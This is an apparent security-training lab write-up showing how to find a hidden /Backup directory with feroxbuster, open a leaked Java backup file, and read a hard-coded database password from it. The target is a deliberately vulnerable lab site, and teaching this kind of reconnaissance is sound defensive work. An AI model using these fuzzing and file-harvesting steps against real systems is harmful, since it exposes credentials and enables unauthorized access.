## Source code disclosure via backup files

This lab leaks its source code via backup files in a hidden directory. To solve the lab, identify and submit the database password, which is hard-coded in the leaked source code.

## Notes

- /Backup
- ProductTemplate.java.bak

## Resume

1. Fuzz the url to find the backup folder
2. Access the ProductTemplate.java.bak
3. Find the **database password**

## Solve 

First step is to find the "backup" endpoit, for this we will fuzz the url : 


```bash
feroxbuster -u https://0ac500cd039cd246804bfd5600d20093.web-security-academy.net 
```

`200      GET       16l       29w      435c https://0ac500cd039cd246804bfd5600d20093.web-security-academy.net/Backup`

Access the `/backup` to see the : `/backup/ProductTemplate.java.bak` to find the **databse password** :

```java
        ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "hg775plyc9ordhvz9e14jzi6ww7scikt"
        ).withAutoCommit();
```

